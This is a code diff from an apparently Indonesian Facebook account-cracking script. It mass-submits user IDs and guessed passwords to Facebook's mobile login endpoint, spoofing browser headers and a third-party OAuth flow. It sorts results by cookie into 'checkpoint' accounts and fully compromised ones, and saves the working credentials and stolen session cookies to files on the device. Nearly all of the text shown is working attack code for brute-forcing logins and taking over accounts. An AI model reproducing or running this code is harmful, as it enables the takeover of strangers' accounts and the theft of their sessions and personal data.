Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%2526frame%253Df3c4e1988fb4ef4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv4.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df183c91f29c2034%26domain%3Dmyim3app.indosatooredoo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252Ff1fbb9d1d151054%26relation%3Dopener%26frame%3Df3c4e1988fb4ef4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={
+            "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
+            "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
+            "uid": idf,
+            "next": "https://m.facebook.com/v4.0/dialog/oauth?app_id=2572246932852997&cbt=1701324889315&channel_url=https.staticxx.facebook.com&connect=xd_arbiter&version=2523&cb%253Df19ad207fd5edc%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%26client_id%3D2572246932852997%26display%3Dtouch%26domain%3Dmyim3app.indosatooredoo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252F%2523%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df1591e23a79190c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df183c91f29c2034%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%2526frame%253Df3c4e1988fb4ef4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv4.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified",
+            "flow": "login_no_pin",
+            "pass": pw,
+            }
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2; wd=360x648'
+			heade={
+            'Host': 'm.facebook.com',
+            'cache-control': 'max-age=0',
+            'dpr': '1',
+            'viewport-width': '384',
+            'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"15.0.0"',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="119.0.6045.160", "Chromium";v="119.0.6045.160", "Not?A_Brand";v="24.0.0.0"',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'upgrade-insecure-requests': '1',
+            'content-type': 'application/x-www-form-urlencoded',
+            'user-agent': ua,
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&api_key=2572246932852997&kid_directed_site=0&app_id=2572246932852997&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fapp_id%3D2572246932852997%26cbt%3D1701324889315%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df19ad207fd5edc%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%26client_id%3D2572246932852997%26display%3Dtouch%26domain%3Dmyim3app.indosatooredoo.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252F%2523%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df1591e23a79190c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df183c91f29c2034%2526domain%253Dmyim3app.indosatooredoo.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmyim3app.indosatooredoo.com%25252Ff1fbb9d1d151054%2526relation%253Dopener%2526frame%253Df3c4e1988fb4ef4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv4.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df183c91f29c2034%26domain%3Dmyim3app.indosatooredoo.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmyim3app.indosatooredoo.com%252Ff1fbb9d1d151054%26relation%3Dopener%26frame%3Df3c4e1988fb4ef4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+            'accept-language': 'en-US,en;q=0.9'
+            }
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				print(f'\r┗━ {kun}{idf}|{pw}\n{xxx}┗━ {mer}{ua}{xxx}')
+				#os.popen('play-audio c.mp3')
+				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r┗━ {hijo}{idf}|{pw}\n{xxx}┗━{biru}{kuki}')
+				#os.popen('play-audio o.mp3')
+				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				break
+				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			waktu(31)
+	loop+=1
 	
-	###----------[ GENERATE USER AGENT CRACK ]---------- ###
-	def generate_ugent(self):
-		#versi_android = random.randint(4,12)
-		#versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-		#versi_app = random.randint(410000000,499999999)
-		#device = random.choice(["SM-G900P Build/LRX21T; wv","SM-T535 Build/LRX22G","SM-T231 Build/KOT49H","SM-J320F Build/LMY47V","GT-I9190 Build/KOT49H","GT-N7100 Build/KOT49H","SM-T561 Build/KTU84P","GT-I9500 Build/LRX22C"])
-		#density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
-		ugent = f"Mozilla/5.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
-		return ugent		
-		
-if __name__=="__main__":
-	try:os.system("git pull")
+###----------#[ CREAT FILE ]#----------###
+def memulai():
+	try:os.mkdir('/sdcard/AKUN-OK')
 	except:pass
-	try:os.mkdir("OK")
+	try:os.mkdir('/sdcard/DUMP-FILE')
 	except:pass
-	try:os.mkdir("CP")
+	try:os.mkdir('/sdcard/AKUN-CP')
 	except:pass
-	try:os.mkdir("data")
-	except:pass
-	Menu().menu()
-#Gunakan Facebook dalam mode dasar dengan Telkomsel
+	menu()
+if __name__=='__main__':
+	memulai()
